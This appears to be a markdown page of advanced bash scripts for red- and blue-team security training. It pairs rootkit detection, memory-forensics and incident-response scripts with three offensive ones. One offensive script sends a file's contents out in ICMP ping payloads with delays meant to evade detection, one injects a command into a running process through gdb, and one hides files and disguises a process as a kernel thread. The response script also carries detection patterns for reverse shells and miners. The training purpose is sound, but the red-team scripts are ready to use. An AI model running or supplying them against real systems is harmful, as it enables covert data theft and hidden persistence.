# Advanced Bash Scripts for Security Training

## Overview

Advanced scripts for sophisticated attack simulation and defense techniques including rootkit detection, memory forensics, and automated incident response.

---

## Red Team Advanced Scripts

### RT-A01: Covert Channel via ICMP

```bash
#!/bin/bash
#######################################
# ICMP Covert Channel
# Data exfiltration via ping
# For authorized lab testing only
#######################################

DATA_FILE="$1"
TARGET_IP="${2:-192.168.1.100}"

if [ -z "$DATA_FILE" ]; then
    echo "Usage: $0 <data_file> [target_ip]"
    exit 1
fi

echo "[*] Exfiltrating via ICMP to $TARGET_IP..."

# Encode data as hex
DATA=$(xxd -p "$DATA_FILE" | tr -d '\n')

# Send data in ICMP payload chunks
CHUNK_SIZE=32
TOTAL=${#DATA}
OFFSET=0

while [ $OFFSET -lt $TOTAL ]; do
    CHUNK=${DATA:$OFFSET:$CHUNK_SIZE}

    # Send ICMP with data in payload
    ping -c 1 -p "$CHUNK" "$TARGET_IP" &>/dev/null

    # Random delay to avoid detection
    sleep $(echo "scale=2; $RANDOM/32767*2" | bc)

    OFFSET=$((OFFSET + CHUNK_SIZE))
done

echo "[+] Exfiltration complete"
```

### RT-A02: Process Injection Simulator

```bash
#!/bin/bash
#######################################
# Process Injection Simulator
# Simulates hollowing via debugging
# For authorized lab testing only
#######################################

TARGET_PID="${1:-$$}"

echo "[*] Process Injection Simulator"
echo "[*] Target PID: $TARGET_PID"

# Check if ptrace is available
if ! command -v gdb &>/dev/null; then
    echo "[!] gdb required for injection simulation"
    exit 1
fi

# Simulated injection via GDB
PAYLOAD='echo "Injected code executed at $(date)" >> /tmp/.injection_log'

cat > /tmp/.inject.gdb << EOF
attach $TARGET_PID
call (int)system("$PAYLOAD")
detach
quit
EOF

echo "[*] Attempting injection..."
gdb -batch -x /tmp/.inject.gdb 2>/dev/null

if grep -q "Injected code executed" /tmp/.injection_log 2>/dev/null; then
    echo "[+] Injection successful"
else
    echo "[-] Injection failed (may require privileges)"
fi

rm -f /tmp/.inject.gdb
```

### RT-A03: Kernel Module Rootkit Simulator

```bash
#!/bin/bash
#######################################
# Rootkit Behavior Simulator
# Simulates common rootkit hiding
# For authorized lab testing only
#######################################

echo "[*] Rootkit Behavior Simulator"
echo "[!] This simulates rootkit techniques without actual kernel mods"
echo ""

# Create hidden files (userland hiding)
echo "[*] Creating hidden artifacts..."
mkdir -p /tmp/.hidden_dir
echo "FLAG{rootkit_hiding}" > /tmp/.hidden_dir/.secret

# Create process that hides from simple ps
echo "[*] Creating 'hidden' process..."
cat > /tmp/.hidden_proc.sh << 'EOF'
#!/bin/bash
exec -a "[kworker/0:1]" bash -c 'while true; do sleep 60; done'
EOF
chmod +x /tmp/.hidden_proc.sh
nohup /tmp/.hidden_proc.sh &>/dev/null &
HIDDEN_PID=$!

echo "[*] Hidden process PID: $HIDDEN_PID"
echo "[*] Process will appear as: [kworker/0:1]"

# Modify ld.so.preload (requires root)
if [ "$(id -u)" -eq 0 ]; then
    echo "[*] Would modify /etc/ld.so.preload for library injection"
    # Not actually doing this to avoid system issues
fi

echo ""
echo "[+] Simulation artifacts created"
echo "[*] Hidden dir: /tmp/.hidden_dir/"
echo "[*] Hidden proc: PID $HIDDEN_PID (masquerading as kworker)"
echo ""
echo "[*] Blue Team Challenge: Find all artifacts!"
```

---

## Blue Team Advanced Scripts

### BT-A01: Rootkit Detection Suite

```bash
#!/bin/bash
#######################################
# Rootkit Detection Suite
# Multi-vector rootkit hunting
#######################################

RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

REPORT="/tmp/rootkit_scan_$(date +%Y%m%d_%H%M%S).txt"

alert() {
    echo -e "${RED}[ROOTKIT INDICATOR]${NC} $1"
    echo "[ALERT] $1" >> "$REPORT"
}

warn() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
    echo "[WARN] $1" >> "$REPORT"
}

ok() {
    echo -e "${GREEN}[OK]${NC} $1"
}

echo "════════════════════════════════════════════════════"
echo "         Advanced Rootkit Detection"
echo "════════════════════════════════════════════════════"
echo ""

# 1. Check for hidden processes (proc vs ps)
echo "[*] Checking for hidden processes..."
PROC_PIDS=$(ls -1 /proc | grep -E '^[0-9]+$' | sort -n)
PS_PIDS=$(ps -eo pid --no-headers | tr -d ' ' | sort -n)

for pid in $PROC_PIDS; do
    if ! echo "$PS_PIDS" | grep -q "^${pid}$"; then
        alert "Hidden process detected: PID $pid"
        ls -la "/proc/$pid/exe" 2>/dev/null
    fi
done

# 2. Check for process name spoofing
echo ""
echo "[*] Checking for process name spoofing..."
ps aux | while read line; do
    cmd=$(echo "$line" | awk '{print $11}')
    if echo "$cmd" | grep -qE '^\[.*\]$'; then
        pid=$(echo "$line" | awk '{print $2}')
        exe=$(readlink "/proc/$pid/exe" 2>/dev/null)
        if [ -n "$exe" ] && [[ ! "$exe" =~ ^/usr/|^/lib|^/sbin ]]; then
            alert "Suspicious kernel thread impersonation: PID $pid ($exe)"
        fi
    fi
done

# 3. Check for LD_PRELOAD injection
echo ""
echo "[*] Checking for LD_PRELOAD injection..."
if [ -f /etc/ld.so.preload ]; then
    content=$(cat /etc/ld.so.preload)
    if [ -n "$content" ]; then
        alert "LD_PRELOAD entries found: $content"
    fi
fi

# Check running processes for LD_PRELOAD
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    preload=$(cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n' | grep LD_PRELOAD)
    if [ -n "$preload" ]; then
        cmdline=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ')
        warn "Process $pid has LD_PRELOAD set: $preload"
    fi
done

# 4. Check for kernel module tampering
echo ""
echo "[*] Checking kernel modules..."

# Compare loaded modules with expected
SUSPICIOUS_MODULES=$(lsmod | awk 'NR>1 {print $1}' | while read mod; do
    if ! modinfo "$mod" &>/dev/null; then
        echo "$mod"
    fi
done)

if [ -n "$SUSPICIOUS_MODULES" ]; then
    alert "Modules without info: $SUSPICIOUS_MODULES"
fi

# 5. Check for syscall table modifications (indirect)
echo ""
echo "[*] Checking for syscall anomalies..."

# Compare /bin/ls output with direct readdir
LS_COUNT=$(ls -la /tmp 2>/dev/null | wc -l)
READDIR_COUNT=$(find /tmp -maxdepth 1 2>/dev/null | wc -l)

if [ "$((LS_COUNT - READDIR_COUNT))" -gt 5 ] || [ "$((READDIR_COUNT - LS_COUNT))" -gt 5 ]; then
    warn "File listing discrepancy detected (ls: $LS_COUNT, find: $READDIR_COUNT)"
fi

# 6. Check for netstat/ss hiding
echo ""
echo "[*] Checking for hidden network connections..."
SS_CONNS=$(ss -tn 2>/dev/null | wc -l)
PROC_CONNS=$(cat /proc/net/tcp 2>/dev/null | wc -l)

if [ "$((PROC_CONNS - SS_CONNS))" -gt 5 ]; then
    warn "Network connection hiding detected"
fi

# 7. Run external rootkit checkers if available
echo ""
echo "[*] Running external rootkit checkers..."

if command -v chkrootkit &>/dev/null; then
    echo "[*] Running chkrootkit..."
    chkrootkit 2>/dev/null | grep -E "INFECTED|Searching" >> "$REPORT"
fi

if command -v rkhunter &>/dev/null; then
    echo "[*] Running rkhunter..."
    rkhunter --check --skip-keypress 2>/dev/null | grep -E "Warning|Rootkit" >> "$REPORT"
fi

echo ""
echo "════════════════════════════════════════════════════"
echo "Scan complete. Report saved to: $REPORT"
echo "════════════════════════════════════════════════════"
```

### BT-A02: Memory Forensics Script

```bash
#!/bin/bash
#######################################
# Memory Forensics Collection
# For incident response
#######################################

EVIDENCE_DIR="/tmp/memory_forensics_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "════════════════════════════════════════════════════"
echo "         Memory Forensics Collection"
echo "════════════════════════════════════════════════════"
echo ""

# 1. Capture process memory maps
echo "[*] Capturing process memory maps..."
for pid in $(ls /proc | grep -E '^[0-9]+$' | head -50); do
    if [ -r "/proc/$pid/maps" ]; then
        cp "/proc/$pid/maps" "$EVIDENCE_DIR/pid_${pid}_maps.txt" 2>/dev/null
        cp "/proc/$pid/cmdline" "$EVIDENCE_DIR/pid_${pid}_cmdline.txt" 2>/dev/null
    fi
done

# 2. Capture environment variables of suspicious processes
echo "[*] Capturing process environments..."
ps aux | grep -iE "powershell|cmd|nc|python|perl|ruby" | grep -v grep | \
    awk '{print $2}' | while read pid; do
    cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n' > "$EVIDENCE_DIR/pid_${pid}_environ.txt"
done

# 3. Capture network sockets per process
echo "[*] Capturing network socket info..."
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    fds=$(ls -la "/proc/$pid/fd" 2>/dev/null | grep socket)
    if [ -n "$fds" ]; then
        echo "PID $pid:" >> "$EVIDENCE_DIR/network_sockets.txt"
        echo "$fds" >> "$EVIDENCE_DIR/network_sockets.txt"
        cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ' >> "$EVIDENCE_DIR/network_sockets.txt"
        echo -e "\n" >> "$EVIDENCE_DIR/network_sockets.txt"
    fi
done

# 4. Capture /dev/mem if available and permitted
if [ -r /dev/mem ]; then
    echo "[*] /dev/mem accessible - capturing kernel strings..."
    strings /dev/mem 2>/dev/null | grep -iE "password|secret|key" | head -100 > "$EVIDENCE_DIR/mem_strings.txt"
fi

# 5. Capture kernel ring buffer
echo "[*] Capturing kernel messages..."
dmesg > "$EVIDENCE_DIR/dmesg.txt"

# 6. Full memory dump (if avml available)
if command -v avml &>/dev/null; then
    echo "[*] Capturing full memory dump with avml..."
    avml "$EVIDENCE_DIR/memory.lime"
fi

# 7. Create summary
echo "[*] Creating summary..."
cat > "$EVIDENCE_DIR/SUMMARY.txt" << EOF
Memory Forensics Collection
===========================
Date: $(date)
Hostname: $(hostname)
Kernel: $(uname -r)

Files Collected:
$(ls -la "$EVIDENCE_DIR")

Process Count: $(ls /proc | grep -cE '^[0-9]+$')
Network Connections: $(ss -tn | wc -l)
Loaded Modules: $(lsmod | wc -l)
EOF

# 8. Package evidence
echo "[*] Packaging evidence..."
tar -czf "${EVIDENCE_DIR}.tar.gz" -C "$(dirname $EVIDENCE_DIR)" "$(basename $EVIDENCE_DIR)"

echo ""
echo "[+] Evidence collected: ${EVIDENCE_DIR}.tar.gz"
echo "[*] SHA256: $(sha256sum ${EVIDENCE_DIR}.tar.gz | awk '{print $1}')"
```

### BT-A03: Automated Incident Response

```bash
#!/bin/bash
#######################################
# Automated Incident Response
# Detect, Contain, Collect, Report
#######################################

IR_DIR="/var/incident_response/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$IR_DIR"/{evidence,logs,reports}

LOG="$IR_DIR/logs/ir_log.txt"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"
}

log "════════════════════════════════════════════════════"
log "     AUTOMATED INCIDENT RESPONSE INITIATED"
log "════════════════════════════════════════════════════"

# PHASE 1: DETECTION
log ""
log "[PHASE 1] DETECTION"
log "──────────────────"

THREAT_DETECTED=0

# Check for active reverse shells
log "Checking for reverse shells..."
SHELLS=$(ps aux | grep -iE "bash.*-i.*>/dev/tcp|nc.*-e|python.*socket" | grep -v grep)
if [ -n "$SHELLS" ]; then
    log "[THREAT] Active reverse shell detected!"
    echo "$SHELLS" >> "$IR_DIR/evidence/reverse_shells.txt"
    THREAT_DETECTED=1
fi

# Check for cryptominers
log "Checking for cryptominers..."
MINERS=$(ps aux | grep -iE "xmrig|minerd|ethminer|cgminer" | grep -v grep)
if [ -n "$MINERS" ]; then
    log "[THREAT] Cryptominer detected!"
    echo "$MINERS" >> "$IR_DIR/evidence/cryptominers.txt"
    THREAT_DETECTED=1
fi

# Check for C2 connections
log "Checking for C2 connections..."
C2_PORTS="4444 5555 6666 7777 8888 9999"
for port in $C2_PORTS; do
    conns=$(ss -tn state established "dport = :$port" 2>/dev/null)
    if [ -n "$conns" ]; then
        log "[THREAT] C2 connection on port $port!"
        echo "$conns" >> "$IR_DIR/evidence/c2_connections.txt"
        THREAT_DETECTED=1
    fi
done

if [ $THREAT_DETECTED -eq 0 ]; then
    log "[OK] No obvious threats detected"
    exit 0
fi

# PHASE 2: CONTAINMENT
log ""
log "[PHASE 2] CONTAINMENT"
log "────────────────────"

# Save current network state
log "Saving network state..."
ss -tulpn > "$IR_DIR/evidence/network_pre_containment.txt"
iptables-save > "$IR_DIR/evidence/iptables_pre_containment.rules"

# Option to isolate
read -t 10 -p "Isolate host from network? (y/n, 10s timeout): " ISOLATE
if [ "$ISOLATE" = "y" ]; then
    log "Isolating host..."
    iptables -I OUTPUT -j DROP
    iptables -I INPUT -j DROP
    iptables -I OUTPUT -o lo -j ACCEPT
    iptables -I INPUT -i lo -j ACCEPT
    log "Host isolated"
else
    log "Skipping network isolation"
fi

# Kill malicious processes
log "Terminating malicious processes..."
ps aux | grep -iE "bash.*-i.*>/dev/tcp|nc.*-e|xmrig" | grep -v grep | \
    awk '{print $2}' | while read pid; do
    log "Killing PID $pid"
    ps -p "$pid" -o pid,ppid,cmd >> "$IR_DIR/evidence/killed_processes.txt"
    kill -9 "$pid" 2>/dev/null
done

# PHASE 3: COLLECTION
log ""
log "[PHASE 3] EVIDENCE COLLECTION"
log "────────────────────────────"

log "Collecting process list..."
ps auxf > "$IR_DIR/evidence/processes.txt"

log "Collecting network connections..."
ss -tulpn > "$IR_DIR/evidence/network.txt"

log "Collecting cron jobs..."
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u "$user" -l >> "$IR_DIR/evidence/crontabs.txt" 2>/dev/null
done

log "Collecting recent files..."
find /tmp /var/tmp /dev/shm -mmin -60 -ls > "$IR_DIR/evidence/recent_files.txt" 2>/dev/null

log "Collecting auth logs..."
tail -1000 /var/log/auth.log > "$IR_DIR/evidence/auth_log.txt" 2>/dev/null

# PHASE 4: REPORTING
log ""
log "[PHASE 4] REPORT GENERATION"
log "──────────────────────────"

cat > "$IR_DIR/reports/incident_summary.txt" << EOF
INCIDENT RESPONSE SUMMARY
=========================
Date: $(date)
Hostname: $(hostname)
Responding User: $(whoami)

THREATS DETECTED:
$(cat "$IR_DIR/evidence/"*.txt 2>/dev/null | head -50)

ACTIONS TAKEN:
- Malicious processes terminated
- Evidence collected
$([ "$ISOLATE" = "y" ] && echo "- Host network isolated")

EVIDENCE LOCATION:
$IR_DIR

NEXT STEPS:
1. Review evidence files
2. Analyze malware samples
3. Determine root cause
4. Plan remediation
5. Update detection rules
EOF

log ""
log "════════════════════════════════════════════════════"
log "INCIDENT RESPONSE COMPLETE"
log "Evidence directory: $IR_DIR"
log "════════════════════════════════════════════════════"

# Archive everything
tar -czf "${IR_DIR}.tar.gz" -C "$(dirname $IR_DIR)" "$(basename $IR_DIR)"
log "Archive created: ${IR_DIR}.tar.gz"
```

---

## Advanced Exercises

### Exercise A-01: Full Attack Chain
Red Team creates complete attack:
1. Initial access via BadUSB
2. Persistence via multiple methods
3. Privilege escalation attempt
4. Data exfiltration via covert channel

Blue Team must:
1. Detect each stage
2. Document timeline
3. Remove all artifacts
4. Write incident report

### Exercise A-02: Forensic Challenge
Provided: Memory dump from compromised system
Task: Identify:
- Initial infection vector
- Persistence mechanisms
- C2 communication
- Data accessed/exfiltrated

### Exercise A-03: Detection Engineering
Create detection rules for each RT script:
- Sigma rules for SIEM
- Snort/Suricata rules for network
- YARA rules for file scanning
- Custom bash monitoring scripts

---

[← Back to Advanced](../README.md)
